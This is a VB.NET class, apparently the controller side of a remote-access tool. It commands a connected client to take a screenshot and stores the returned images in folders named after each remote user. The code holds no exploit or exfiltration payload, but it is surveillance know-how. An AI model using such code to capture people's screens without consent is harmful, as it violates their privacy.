Imports System.IO

Public Class clsScreenshot
    'Public
    Inherits clsBoneObj

    'Private
    Private InfoObj As clsInfo = Nothing

    Public Sub New(ByVal mConn As clsConnection, mInfoObj As clsInfo)
        Conn = mConn
        InfoObj = mInfoObj
    End Sub

    Public Overrides Sub OnInit()
        'Init Screenshot Obj ID
        ObjID = 4
    End Sub

    Public Overrides Sub OnExit()

    End Sub

    Public Overrides Sub OnPacketArrived(ByVal packet() As Byte)
        Dim BinReader As clsArrayBinaryReader = mGlobal.GetBinReaderObj()
        Dim ID As Byte = packet(0)
        Select Case ID
            Case 0 'Case received BMP screenshot
                Dim screenshotPath As String = GetScreenshotPath()
                If (Not Directory.Exists(screenshotPath)) Then
                    Directory.CreateDirectory(screenshotPath)
                End If
                Dim bmpBuffer As Byte()
                bmpBuffer = BinReader.BufferReadBuffer(packet, 1, packet.Length - 1)
                Using outFile As New System.IO.FileStream(screenshotPath & System.DateTime.Now.ToString("dd-MM-yyyy HH-mm-ss") & ".bmp", IO.FileMode.Create, IO.FileAccess.Write)
                    outFile.Write(bmpBuffer, 0, bmpBuffer.Length)
                    outFile.Close()
                End Using
            Case 100
                Utilities.GlobalLog("Failed to take screenshot of " + InfoObj.GetClientInfo().computerUserName)
        End Select

    End Sub

    Public Sub SendTakeScreenshot()
        Dim BinWritter As clsArrayBinaryWritten = mGlobal.GetBinWritterObj()
        Dim packet As Byte() = {}

        BinWritter.BufferAddByte(packet, 1)
        SendPacket(packet)
    End Sub

    Public Function GetScreenshotPath() As String
        Return Application.StartupPath + "\Users\" + InfoObj.GetClientInfo().computerUserName.Replace("/", "@").Replace(Convert.ToChar(0), "") + "\Screenshots\"
    End Function
End Class
